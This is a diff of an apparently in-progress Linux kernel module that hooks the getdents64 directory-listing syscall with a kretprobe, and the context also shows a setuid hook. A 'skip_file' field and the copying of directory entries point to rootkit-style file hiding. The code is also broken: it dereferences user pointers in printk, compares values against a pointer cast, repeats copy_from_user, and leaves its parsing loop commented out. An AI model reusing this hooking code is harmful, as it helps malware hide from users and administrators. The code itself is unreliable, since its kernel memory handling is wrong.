@@ -53,9 +53,9 @@ void __x64_sys_setuid_post_handler(struct kprobe *kp, struct pt_regs *regs, unsi
 
 /* struct for info to be passed from entry handler to post handler */
 static struct getdents_data{
-    void __user *dirent_buf;
-    int skip_file;
+    struct linux_dirent64 *dirent_buf;
     int count;
+    int skip_file;
 };
 
 
@@ -69,21 +69,23 @@ static int __x64_sys_getdents64_entry_handler(struct kretprobe_instance *ri, str
 	dentry_data->dirent_buf=(void __user *)regs->si;
 	dentry_data->count=regs->dx;
 
+
 	return 0;
 }
 
 static int __x64_sys_getdents64_post_handler(struct kretprobe_instance *ri, struct pt_regs *regs){
 
-	struct getdents_data *dentry_data=(struct getdents_data *)ri->data;
+	struct linux_dirent64 __user *dentry_data=(struct linux_dirent64 *)regs->si;
 
-	struct linux_dirent64 *d,*prev=NULL;
+	struct linux_dirent64 *current_dir,*dirent_ker=NULL;
 	unsigned long offset = 0;
 
+	printk(KERN_INFO "LOLOL: %s",dentry_data->d_name);
 
 	ssize_t ret = regs_return_value(regs);
 	printk(KERN_INFO "getdents returned %d bytes", ret);
 
-	if(ret<=dentry_data->count){
+	if(ret<=(struct linux_dirent64 *)regs->dx){
 		printk(KERN_DEBUG "ret is less than count");
 	}
 	char *kbuf=kzalloc(ret,GFP_KERNEL);
@@ -96,18 +98,24 @@ static int __x64_sys_getdents64_post_handler(struct kretprobe_instance *ri, stru
 		return ret;
 
 
-	long error = copy_from_user(kbuf,dentry_data->dirent_buf,8);
+	if(!access_ok(dentry_data, ret)){
+		printk(KERN_ERR "access_ok failed on user pointer %px", dentry_data);
+	}else {
+		int copied=copy_from_user(kbuf,dentry_data,ret);
+	}
+
+
+	long error = copy_from_user(kbuf,dentry_data,ret);
 	if(error){
 		printk(KERN_ERR "could not copy %ld bytes from user",ret);
 		printk(KERN_ERR "copy_from_user error: %ld",error);
 	}
-	char *ptr = kbuf;
 
 /*
 	while(offset<ret){
 		current_dir = (void *)kbuf+offset;
 		dentry_data.d_name_ptr=(unsigned long)(unsigned char *)dirent->d_name;
-		printk(KERN_INFO "dentry_data->d_name_ptr is: %l", dentry_data.d_name_ptr);
+		printk(KERN_INFO "dentry_data->d_name_ptr is: %l", dentry_data);
 		return 0;
 	}
 
@@ -119,11 +127,9 @@ static int __x64_sys_getdents64_post_handler(struct kretprobe_instance *ri, stru
 }
 
 static struct kretprobe  __x64_sys_getdents64_hook= {
-    .entry_handler 		= __x64_sys_getdents64_entry_handler,
 	.handler 		= __x64_sys_getdents64_post_handler,
 	.kp.symbol_name		="__x64_sys_getdents64",
 	.maxactive		=20,
-	.data_size		=sizeof(struct getdents_data),
 };
 
 
